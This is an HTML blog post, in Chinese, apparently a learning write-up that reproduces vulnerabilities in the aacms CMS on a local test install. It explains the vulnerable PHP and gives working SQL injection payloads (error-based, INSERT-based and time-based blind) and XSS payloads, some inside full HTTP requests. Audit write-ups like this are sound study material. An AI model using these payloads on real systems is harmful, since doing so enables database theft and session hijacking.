@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="aacms审计参考：https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;229981.html   —- heihu577师傅 0x00前言第一次审计一个cms，本来是打算审计yzmcms5.7版本的，但是后来发现了heihu577师傅在freebuf上的文章，细看了一下觉着很好，然后就想跟着师傅学习一下，这篇文章既是对师傅所说的一些漏洞进行复现，也是自己的学习过程。 0x01 urldec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/01/16/aacms%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="aacms审计参考：https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;229981.html   —- heihu577师傅 0x00前言第一次审计一个cms，本来是打算审计yzmcms5.7版本的，但是后来发现了heihu577师傅在freebuf上的文章，细看了一下觉着很好，然后就想跟着师傅学习一下，这篇文章既是对师傅所说的一些漏洞进行复现，也是自己的学习过程。 0x01 urldec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/md/php/images/aacms_2.png">
+<meta property="og:image" content="d:/md/php/images/aacms_1.png">
+<meta property="og:image" content="d:/md/php/images/aacms_3.png">
+<meta property="og:image" content="d:/md/php/images/aacms_4.png">
+<meta property="og:image" content="d:/md/php/images/aacms_5.png">
+<meta property="og:image" content="d:/md/php/images/aacms_6.png">
+<meta property="og:image" content="d:/md/php/images/aacms_7.png">
+<meta property="og:image" content="d:/md/php/images/aacms_8.png">
+<meta property="og:image" content="d:/md/php/images/aacms_9.png">
+<meta property="og:image" content="d:/md/php/images/aacms_10.png">
+<meta property="article:published_time" content="2022-01-16T04:22:23.477Z">
+<meta property="article:modified_time" content="2021-01-29T08:49:12.000Z">
+<meta property="article:author" content="Mechoy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/md/php/images/aacms_2.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-aacms审计" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/16/aacms%E5%AE%A1%E8%AE%A1/" class="article-date">
+  <time class="dt-published" datetime="2022-01-16T04:22:23.477Z" itemprop="datePublished">2022-01-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="aacms审计"><a href="#aacms审计" class="headerlink" title="aacms审计"></a>aacms审计</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/229981.html">https://www.freebuf.com/vuls/229981.html</a>   —- heihu577师傅</p>
+<h4 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h4><p>第一次审计一个cms，本来是打算审计yzmcms5.7版本的，但是后来发现了heihu577师傅在freebuf上的文章，细看了一下觉着很好，然后就想跟着师傅学习一下，这篇文章既是对师傅所说的一些漏洞进行复现，也是自己的学习过程。</p>
+<h4 id="0x01-urldecode引发的注入"><a href="#0x01-urldecode引发的注入" class="headerlink" title="0x01 urldecode引发的注入"></a>0x01 urldecode引发的注入</h4><p>功能点在：后台-&gt;工具-&gt;更新缓存</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;title=%EF%BF%BD%EF%BF%BD%EF%BF%BD%C2%BB%EF%BF%BD%EF%BF%BD%EF%BF%BD&amp;url=?action%253Dtool%2526operation%253Dupdatecache">http://127.0.0.1/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;title=%B8%FC%D0%C2%BB%BA%B4%E6&amp;url=%3Faction%253Dtool%2526operation%253Dupdatecache</a></p>
+<p><img src="D:\md\php\images\aacms_2.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$operation</span> == <span class="string">&#x27;custommenu_add&#x27;</span>) &#123;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>] &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &#123;</span><br><span class="line">			</span><br><span class="line">		<span class="variable">$title</span> = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);				<span class="comment">//	将title进行url解码</span></span><br><span class="line">		<span class="variable">$url</span> = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span>(DB::getOne(<span class="string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="string">&#x27;admincp_menu&#x27;</span>).<span class="string">&quot; WHERE title=&#x27;<span class="subst">$title</span>&#x27;&quot;</span>)) &#123;</span><br><span class="line">			cpmsg(<span class="string">&#x27;custommenu_duplicate&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		DB::insert(<span class="string">&#x27;admincp_menu&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;title&#x27;</span> =&gt; <span class="variable">$title</span>,</span><br><span class="line">			<span class="string">&#x27;displayorder&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">			<span class="string">&#x27;url&#x27;</span> =&gt; <span class="variable">$url</span></span><br><span class="line">		));</span><br><span class="line">			</span><br><span class="line">		cpmsg(<span class="string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;succeed&#x27;</span>);</span><br><span class="line">			</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		cpmsg(<span class="string">&#x27;parameters_error&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>首先我们知道该cms对于传进的参数会经过daddslashes()处理，这就导致**’  “**等都不可以用（这里本身是存在宽字节注入，但是不知什么原因，宽字节注入无法实现），</p>
+<p>这里由于使用了urldecode()，使得我们可以传入%2527(也就是 <strong>‘</strong> 经过两次url编码)，在传入后台时，%2527进行一次解码，变为%27，此时进入daddslashes()处理，由于没有引号，所以并不会对参数造成什么影响，然后进入该段代码，执行urldecode()，执行结果直接传入sql语句中，由此可以绕过daddslashes()的处理，去执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DB::getOne(<span class="string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="string">&#x27;admincp_menu&#x27;</span>).<span class="string">&quot; WHERE title=&#x27;<span class="subst">$title</span>&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时只需要构造title的payload来进行注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="number">2527</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--%20</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\md\php\images\aacms_1.png"></p>
+<h4 id="0x02-二次注入漏洞"><a href="#0x02-二次注入漏洞" class="headerlink" title="0x02 二次注入漏洞"></a>0x02 二次注入漏洞</h4><p>还是这个位置，只不过注入点不是同一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$operation</span> == <span class="string">&#x27;custommenu_add&#x27;</span>) &#123;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>] &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &#123;</span><br><span class="line">			</span><br><span class="line">		<span class="variable">$title</span> = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">		<span class="variable">$url</span> = urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span>(DB::getOne(<span class="string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="string">&#x27;admincp_menu&#x27;</span>).<span class="string">&quot; WHERE title=&#x27;<span class="subst">$title</span>&#x27;&quot;</span>)) &#123;</span><br><span class="line">			cpmsg(<span class="string">&#x27;custommenu_duplicate&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		DB::insert(<span class="string">&#x27;admincp_menu&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">&#x27;title&#x27;</span> =&gt; <span class="variable">$title</span>,			</span><br><span class="line">			<span class="string">&#x27;displayorder&#x27;</span> =&gt; <span class="number">0</span>,	</span><br><span class="line">			<span class="string">&#x27;url&#x27;</span> =&gt; <span class="variable">$url</span>				<span class="comment">// 新的注入点</span></span><br><span class="line">		));</span><br><span class="line">			</span><br><span class="line">		cpmsg(<span class="string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;succeed&#x27;</span>);</span><br><span class="line">			</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		cpmsg(<span class="string">&#x27;parameters_error&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>在执行完if里的语句之后会执行一个insert语句，而insert的语法如下，</p>
+<p><strong>在insert into语句执行时，值可以是一条sql语句</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_name (列<span class="number">1</span>，列<span class="number">2</span>，列<span class="number">3.</span>...),<span class="keyword">values</span>(值<span class="number">1</span>,值<span class="number">2</span>,值<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里我们无法对title参数进行构造payload，因为如果构造不当，则会报错，所以正常传入title参数，然后构造url参数的payload</p>
+<p>先随便输入点让服务端在insert语句处报错</p>
+<p><img src="D:\md\php\images\aacms_3.png"></p>
+<p>由此我们可以构造处payload，注意1后面的%2527不能少，否则就没办法闭合url字段接受的值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">1%</span><span class="bash">2527,1),(user(),user(),1)%20--%20</span></span><br></pre></td></tr></table></figure>
+
+<p>执行<a target="_blank" rel="noopener" href="http://127.0.0.1/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;title=1&amp;url=1%2527,1),(user(),user(),1)%20--%20">http://127.0.0.1/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;title=1&amp;url=1%2527,1),(user(),user(),1)%20--%20</a></p>
+<p>在<a target="_blank" rel="noopener" href="http://127.0.0.1/aacms28/admin.php?action=misc&amp;operation=custommenu%E9%A1%B5%E9%9D%A2%E6%9F%A5%E7%9C%8B">http://127.0.0.1/aacms28/admin.php?action=misc&amp;operation=custommenu页面查看</a></p>
+<p><img src="D:\md\php\images\aacms_4.png"></p>
+<p>可以发现插入了两条数据，第二天数据报出了user()的值</p>
+<h4 id="0x03-xss漏洞"><a href="#0x03-xss漏洞" class="headerlink" title="0x03 xss漏洞"></a>0x03 xss漏洞</h4><p>还是那个位置，还是熟悉的味道，这个页面有一个提交的位置，尝试了一下之后发现是可以更改当前操作的名称或url，然后查看页面源代码</p>
+<p><img src="D:\md\php\images\aacms_5.png"></p>
+<p>可以构造出实现xss的payload，由于_GET , _POST等传进的参数都会经过daddslashes()的处理，但是这里是xss，所以不会造成什么影响，可以直接构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\md\php\images\aacms_6.png"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/aacms28/admin.php?action=model&amp;operation=add">http://127.0.0.1/aacms28/admin.php?action=model&amp;operation=add</a></p>
+<p>此处也存在一个xss</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/aacms28/admin.php?action=model&amp;operation=add&amp;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/aacms28/admin.php?action=model&amp;operation=add</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sid=8f019812f837ccc4f249b013ccc54ffbdcdeb64f</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">formhash</span>=<span class="number">303</span>ba<span class="number">9</span>f<span class="number">7</span>&amp;scrolltop=&amp;anchor=&amp;mname=%<span class="number">3</span>Cimg+src%<span class="number">3</span>D<span class="number">1</span>+onclick%<span class="number">3</span>Dalert%<span class="number">281</span>%<span class="number">29</span>%<span class="number">3</span>E&amp;msetting%<span class="number">5</span>Blisttpl%<span class="number">5</span>D=&amp;msetting%<span class="number">5</span>Bviewtpl%<span class="number">5</span>D=&amp;status=<span class="number">0</span>&amp;submit=%CC%E<span class="number">1</span>%BD%BB</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x04-前台sql盲注"><a href="#0x04-前台sql盲注" class="headerlink" title="0x04 前台sql盲注"></a>0x04 前台sql盲注</h4><p>这里需要先在后台文章处添加一个栏目</p>
+<p><img src="D:\md\php\images\aacms_7.png"></p>
+<p>然后再访问<a target="_blank" rel="noopener" href="http://127.0.0.1/aacms28/article.php%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0">http://127.0.0.1/aacms28/article.php就能看到</a></p>
+<p><img src="D:\md\php\images\aacms_8.png"></p>
+<p>给catid参数加个单引号,页面爆出数据库错误</p>
+<p><img src="D:\md\php\images\aacms_9.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/aacms28/article.php?catid=1)--%20  //页面返回正常</span></span><br></pre></td></tr></table></figure>
+
+<p>由此可以构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/aacms28/article.php?catid=1)%20and%20sleep(5)--%20  </span></span><br><span class="line"><span class="comment">//页面延迟20秒，不知道为何，延迟时间会扩大四倍</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\md\php\images\aacms_10.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/aacms28/article.php?catid=1)%20and%20if(length(database())=5,1,sleep(5))--%20  //页面无延迟，可见此处存在盲注</span></span><br></pre></td></tr></table></figure>
+
+<p>这里没有找到源码获取catid参数的源码在哪里，但是通过爆出的sql错误也是能直接注入出来的</p>
+<p>这里也存在一个self-xss，payload为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h4><p>这个cms是个很老的cms，一些功能没办法正常使用，所以审的有点不完全</p>
+<h6 id="自己的问题"><a href="#自己的问题" class="headerlink" title="自己的问题"></a>自己的问题</h6><p>自己在代码方面还是有点不熟悉，跟着师傅的文章走时也有点跟不上，有些时候代码逻辑容易弄混，对于类、方法的调用容易迷糊，然后对php的一些函数也不怎么认识，每次都要去查，就导致速度很慢，而且查出来的之后自己也不一定能够理解该函数在代码中的意思，另外，自己更偏向于从页面去找漏洞，把代码审计玩成了渗透测试</p>
+<h6 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h6><ul>
+<li>可以尝试一些开发，重点在类与方法调用，以及全局变量的使用</li>
+<li>多看，多查，函数的用法只能这样</li>
+<li>代码审计跟渗透测试不太一样，别弄混，就算能在页面上发现漏洞，也要去分析源码，分析漏洞成因，以及利用方法。</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/16/aacms%E5%AE%A1%E8%AE%A1/" data-id="ckygrmkp70000eksb0w1haqvj" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/01/16/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/01/16/aacms%E5%AE%A1%E8%AE%A1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/16/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 Mechoy<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
